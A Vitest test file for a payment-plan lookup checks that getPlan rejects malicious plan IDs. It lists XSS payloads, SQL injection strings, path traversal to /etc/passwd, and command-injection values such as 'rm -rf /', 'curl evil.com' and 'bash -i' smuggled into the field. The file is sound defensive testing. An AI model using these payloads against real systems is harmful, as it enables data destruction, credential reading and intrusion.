import { describe, it, expect } from "vitest";
import { getPlan, type PlanId } from "@/lib/payment-plans";

/**
 * 플랜 ID 입력 검증 — XSS, SSRF, 인젝션 등 보안 케이스 포함.
 *
 * `?plan=` 쿼리는 사용자가 직접 조작할 수 있으므로
 * 모든 비정상 입력에 대해 getPlan은 null을 반환해야 함.
 */

describe("plan id validation — XSS attempts", () => {
  const xssVectors = [
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "onclick=alert(1)",
    "onerror=alert(1)",
    "onload=alert(1)",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<scrip<script>t>alert(1)</script>",
    "%00<script>alert(1)</script>",
    "&lt;script&gt;",
    "\\x3cscript\\x3e",
  ];

  it.each(xssVectors)("rejects XSS vector: %s", (vector) => {
    expect(getPlan(vector)).toBeNull();
  });
});

describe("plan id validation — SQL injection patterns", () => {
  const sqlVectors = [
    "'; DROP TABLE plans; --",
    "1' OR '1'='1",
    "admin'--",
    "premium' OR 1=1--",
    "premium UNION SELECT * FROM users",
    "premium; DELETE FROM plans;",
    "premium\\'",
    "premium--",
    "premium\\0",
  ];

  it.each(sqlVectors)("rejects SQL injection: %s", (vector) => {
    expect(getPlan(vector)).toBeNull();
  });
});

describe("plan id validation — path traversal", () => {
  const pathVectors = [
    "../premium",
    "../../etc/passwd",
    "..\\..\\windows\\system32",
    "premium/../business",
    "%2e%2e%2fpremium",
    "....//premium",
    "premium/../../../",
    "/etc/passwd",
    "C:\\Windows",
  ];

  it.each(pathVectors)("rejects path traversal: %s", (vector) => {
    expect(getPlan(vector)).toBeNull();
  });
});

describe("plan id validation — command injection", () => {
  const cmdVectors = [
    "premium; rm -rf /",
    "premium && cat /etc/passwd",
    "premium | curl evil.com",
    "premium`whoami`",
    "premium$(whoami)",
    "premium; bash -i",
    "premium\\nrm -rf /",
  ];

  it.each(cmdVectors)("rejects command injection: %s", (vector) => {
    expect(getPlan(vector)).toBeNull();
  });
});

describe("plan id validation — encoded variants", () => {
  const encoded = [
    "%70remium", // p
    "%70%72%65%6d%69%75%6d", // premium fully encoded
    "premium%00",
    "premium%20",
    "%2Fpremium%2F",
  ];

  it.each(encoded)("rejects encoded variant: %s", (vector) => {
    expect(getPlan(vector)).toBeNull();
  });
});

describe("plan id validation — Unicode and look-alikes", () => {
  const unicode = [
    "ＰＲＥＭＩＵＭ", // fullwidth
    "ⓟⓡⓔⓜⓘⓤⓜ", // circled
    "𝐩𝐫𝐞𝐦𝐢𝐮𝐦", // mathematical bold
    "p​remium", // zero-width space
    "premiumʼ", // similar character
    "Ρremium", // Greek rho
  ];

  it.each(unicode)("rejects unicode look-alike: %s", (vector) => {
    expect(getPlan(vector)).toBeNull();
  });
});

describe("plan id validation — type coercion attempts", () => {
  it("rejects number 0", () => {
    expect(getPlan(0 as unknown as string)).toBeNull();
  });

  it("rejects number 1", () => {
    expect(getPlan(1 as unknown as string)).toBeNull();
  });

  it("rejects boolean true", () => {
    expect(getPlan(true as unknown as string)).toBeNull();
  });

  it("rejects boolean false", () => {
    expect(getPlan(false as unknown as string)).toBeNull();
  });

  it("rejects null", () => {
    expect(getPlan(null as unknown as string)).toBeNull();
  });

  it("rejects undefined", () => {
    expect(getPlan(undefined)).toBeNull();
  });

  it("rejects empty object", () => {
    expect(getPlan({} as unknown as string)).toBeNull();
  });

  it("rejects empty array", () => {
    expect(getPlan([] as unknown as string)).toBeNull();
  });

  it("rejects function", () => {
    expect(getPlan((() => "premium") as unknown as string)).toBeNull();
  });
});

describe("plan id validation — very long strings (DoS)", () => {
  it("rejects 1000-char string", () => {
    const longStr = "a".repeat(1000);
    expect(getPlan(longStr)).toBeNull();
  });

  it("rejects 10,000-char string", () => {
    const longStr = "premium".repeat(2000);
    expect(getPlan(longStr)).toBeNull();
  });

  it("rejects 100,000-char string (DoS attempt)", () => {
    const longStr = "x".repeat(100_000);
    expect(getPlan(longStr)).toBeNull();
  });
});

describe("plan id validation — happy path baselines", () => {
  const validIds: PlanId[] = ["premium", "business", "expert"];

  it.each(validIds)("'%s' returns a non-null plan", (id) => {
    expect(getPlan(id)).not.toBeNull();
  });

  it.each(validIds)("'%s' result has matching id field", (id) => {
    expect(getPlan(id)?.id).toBe(id);
  });

  it.each(validIds)("'%s' result has positive price", (id) => {
    expect(getPlan(id)?.price).toBeGreaterThan(0);
  });
});

describe("plan id validation — case sensitivity (security)", () => {
  it("'Premium' is rejected (case-sensitive)", () => {
    expect(getPlan("Premium")).toBeNull();
  });

  it("'PREMIUM' is rejected", () => {
    expect(getPlan("PREMIUM")).toBeNull();
  });

  it("'premIUM' is rejected", () => {
    expect(getPlan("premIUM")).toBeNull();
  });

  it("only exact 'premium' (all lowercase) is accepted", () => {
    expect(getPlan("premium")?.id).toBe("premium");
  });
});

describe("plan id validation — surrounding whitespace", () => {
  const wsVariants = [
    " premium",
    "premium ",
    " premium ",
    "premium\t",
    "\tpremium",
    "premium\n",
    "\npremium",
    "premium\r",
  ];

  it.each(wsVariants)("rejects whitespace variant: '%s'", (v) => {
    expect(getPlan(v)).toBeNull();
  });
});
